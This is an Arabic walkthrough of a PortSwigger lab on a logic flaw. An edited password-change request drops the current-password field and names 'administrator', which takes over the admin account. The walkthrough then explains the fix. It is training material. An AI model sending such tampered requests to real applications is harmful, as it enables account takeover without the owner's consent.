# [Weak isolation on dual-use endpoint](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint)

## **`الهدف`**
الدخول إلى حساب `administrator` وحذف المُستخدم `carlos.`
## **`خطوات الحل`**
بمجرد الدخول لحساب `wiener:peter` سنقوم بعمل `request` لتغيير كلمة المرور بأي كلمة مرور جديدة

```http
POST /my-account/change-password HTTP/2
Host: 0ae80052037a0a1880b2805d000f00a1.web-security-academy.net
Cookie: session=tM8POOyGoco5x946NnQ98B1HvuUbcsfm

csrf=5Wvb4bWs89RRP3yhh7oxB72gbbONzjFL&username=wiener&current-password=peter&new-password-1=123&new-password-2=123
```

فنقوم بحذف `&current-password=peter` وتغيير الـ `username` إلى `administrator`

```http
POST /my-account/change-password HTTP/2
Host: 0ae80052037a0a1880b2805d000f00a1.web-security-academy.net
Cookie: session=tM8POOyGoco5x946NnQ98B1HvuUbcsfm

csrf=5Wvb4bWs89RRP3yhh7oxB72gbbONzjFL&username=administrator&new-password-1=123&new-password-2=123
```

وسنجد أن الـ `request` تم بنجاح، وبعد ذلك نستطيع الدخول إلى حساب `administrator` واستعمال لوحة التحكم لحذف حساب `carlos` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**

يجب عدم الثقة في مُدخلات المُستخدم، وعدم الاعتماد على مُعامل اسم المُستخدم في الـ `request` الخاص بتغيير كلمة المرور بل يجب الاعتماد على الجلسة `Session-Based Identity` فالهوية يجب أن تُحدد بناء على الـ `session` المُخزنة على السيرفر، والمربوطة بالـ `cookie`
ويجب جعل حقل الباسورد الحالي إجباريًا، ويقوم السيرفر بالتحقق من صحته مقارنة ببيانات المُستخدم الموجودة على قاعدة البيانات قبل القيام بأي تغيير.

وبما أن معامل `csrf` كان موجود في الـ `request` فيجب على السيرفر التأكد من أن الـ `CSRF Token` يخص الجلسة الحالية`(session)` للمُستخدم وأن العملية تتم فقط على الحساب المرتبط بهذه الجلسة.

وفي الواقع العملي يُفضل تغيير الأسماء الافتراضية لحسابات المديرين `administrator` لتقليل احتمالية هجمات التخمين `Brute Force` وتصعيب الأمور على المُهاجم.
